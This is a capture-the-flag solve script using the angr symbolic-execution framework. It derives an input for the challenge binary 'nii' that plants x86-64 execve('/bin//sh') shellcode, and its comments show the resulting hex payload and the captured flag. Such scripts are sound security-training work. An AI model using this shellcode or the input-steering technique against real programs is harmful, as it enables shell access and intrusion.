#!/usr/bin/env ipython

import angr
from angr import SIM_PROCEDURES
from claripy import BVV, BVS, Or, And, If
from IPython import embed
import logging
import signal
import os

# def sigint_handler(signum, frame):
#     embed()

# signal.signal(signal.SIGINT, sigint_handler)

logger = logging.getLogger('angr')

binary = "./nii"

p = angr.Project(
    binary,
    load_options={"auto_load_libs": False}
)

inp_len = BVS("size", 64)
PL = BVS("PL", 512*8)

s = p.factory.blank_state(addr=0x4010a2)

s.memory.store(0x402064, PL)
s.regs.rbx = inp_len + 1 >> 1
s.regs.rax = inp_len + 1
s.regs.rsi = 0x402064
s.regs.rdi = 0
s.regs.rdx = 0

# s.add_constraints(*[Or(And(byte > 47, byte < 58), And(byte > 57, byte < 64)) for byte in PL.chop(8)])

# s.add_constraints(inp_len == 100)

SHELLCODE = b"4831F65648BF2F62696E2F2F736857545F6A3B58990F05"
# s.add_constraints(s.memory.load(0x402078, size=len(SHELLCODE)) == SHELLCODE)

def transform(state):
    al = state.regs.al
    state.regs.al -= If(And(state.regs.al > 47, state.regs.al < 58),
                       BVV(0x30, 8), BVV(0x37, 8))

p.hook(0x4010b0, length=5)(transform)
p.hook(0x4010bd, length=5)(transform)

sm = p.factory.simulation_manager(s)

find_addr = 0x4011b4
# avoid_addr = [0x401000,0x401122]
avoid_addr = []

def get_addr(state):
    print(sm)
    # print(state.regs.rax)

# s.inspect.b("irsb", angr.BP_AFTER, action=get_addr)
s.inspect.b("fork", when=angr.BP_AFTER, action=get_addr)

sm.explore(find=find_addr, avoid=avoid_addr)

print("hello")

embed()

# sm.active[0].add_constraints(sm.active[0].memory.load(0x402084, size=len(SHELLCODE) == SHELLCODE))
# sm.active[0].add_constraints(PL[20:24] == SHELLCODE)


def test_shellcode(found_state):
    copy = found_state.copy()
    copy.add_constraints(copy.regs.edi == copy.regs.edx)
    copy.add_constraints(copy.memory.load(0x402078, size=len(SHELLCODE)) == SHELLCODE)

    return copy.solver.eval(PL, cast_to=bytes)[:copy.solver.eval(inp_len)]

def get_possible_solutions(found_state):
    print(found_state.solver.eval_upto(found_state.memory.load(0x402078, size=60), 100, cast_to=bytes))

def to_sol(out):
    sol = ""
    for c in out:
        if ord(chr(c)) > 57:
            sol += chr(c + 7)
        else:
            sol += chr(c)
    return sol

embed()

to_sol(test_shellcode(sm.found[0]))
# => 4E494976302E313A54776C7450726E637F454C464831F65648BF2F62696E2F2F736857545F6A3B58990F0567D1E7350E382C

# _[:32] + "AEB14BA3" + _[40:]
# => 4E494976302E313A54776C7450726E63AEB14BA34831F65648BF2F62696E2F2F736857545F6A3B58990F0567D1E7350E382C

# cat flag.txt
# It's dangerous to go alone. Take this!
# flag{shellcoding_is_a_rev_skill,_too!_8F13E8F6}
